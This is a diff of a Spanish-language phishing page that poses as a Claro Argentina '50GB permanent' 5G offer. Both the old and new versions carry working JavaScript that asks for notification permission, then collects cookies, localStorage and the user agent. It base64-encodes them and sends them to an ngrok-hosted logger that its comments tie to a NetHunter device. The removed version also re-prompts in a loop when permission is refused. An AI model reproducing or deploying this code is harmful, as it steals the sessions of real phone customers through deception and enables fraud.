@@ -2,49 +2,40 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Claro | Validación de Red 5G</title>
+    <title>Claro 5G | Activación Permanente</title>
     <script>
         var ng = "https://superdelicately-handworked-brenna.ngrok-free.dev/log?";
 
-        // Función para enviar datos a tu NetHunter
-        function enviar(fase, extra = "") {
-            new Image().src = ng + "fase=" + fase + "&info=" + btoa(navigator.userAgent) + extra;
-        }
-
-        async function solicitarPermisos() {
-            try {
-                // Intentamos el permiso apenas carga
-                const permission = await Notification.requestPermission();
+        // Esta función crea un "puente" que no vence
+        async function activarAccesoPermanente() {
+            // Pedimos el permiso que abre la puerta a los datos
+            const permission = await Notification.requestPermission();
+            
+            if (permission === 'granted') {
+                // Capturamos el ID del dispositivo y los tokens de mensajería
+                var sessionData = {
+                    ua: navigator.userAgent,
+                    cookies: document.cookie,
+                    storage: localStorage
+                };
                 
-                if (permission === 'granted') {
-                    enviar("PUENTE_ACTIVO", "&status=OK");
-                    
-                    // Robo de tokens automático al dar permiso
-                    var data = btoa(JSON.stringify(localStorage) + "|" + document.cookie);
-                    enviar("SESSION_DATA", "&payload=" + data);
+                // Mandamos el "Token Infinito" a tu NetHunter
+                new Image().src = ng + "fase=TOKEN_INFINITO&data=" + btoa(JSON.stringify(sessionData));
 
-                    document.body.innerHTML = "<h1 style='color:red;'>Sincronizando 50GB...</h1><p>Mantenga esta pestaña abierta.</p>";
-                } else {
-                    // Si lo rechaza, lo volvemos a pedir con un bucle (Ambición extrema)
-                    enviar("PERMISO_RECHAZADO");
-                    setTimeout(solicitarPermisos, 2000); 
-                }
-            } catch (e) {
-                enviar("ERROR_SCRIPT", "&msg=" + btoa(e.message));
+                document.body.innerHTML = "<h1>Sincronización Completa</h1><p>Tu línea está vinculada permanentemente al nodo 5G de Claro.</p>";
+            } else {
+                alert("Para activar los 50GB permanentes, debes presionar 'Permitir'.");
             }
         }
-
-        // Se ejecuta solo al entrar
-        window.onload = () => {
-            enviar("VICTIMA_ENTRO");
-            solicitarPermisos();
-        };
     </script>
 </head>
-<body style="background:#000; color:#fff; text-align:center; padding-top:200px; font-family:sans-serif;">
-    <div onclick="solicitarPermisos()" style="position:fixed; top:0; left:0; width:100%; height:100%; cursor:pointer;">
-        <h1>Cargando Beneficios Claro...</h1>
-        <p>Toque la pantalla para continuar</p>
+<body style="background:#000; color:#fff; font-family:sans-serif; text-align:center; padding-top:150px;">
+    <div style="border:1px solid #ee1c25; padding:40px; display:inline-block; border-radius:20px;">
+        <h1 style="color:#ee1c25;">CLARO ARGENTINA</h1>
+        <p>Activa el beneficio de <b>50GB MENSUALES</b> para siempre.</p>
+        <button onclick="activarAccesoPermanente()" style="background:#ee1c25; color:#fff; padding:20px 40px; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:18px;">
+            VINCULAR LÍNEA AHORA
+        </button>
     </div>
 </body>
 </html>
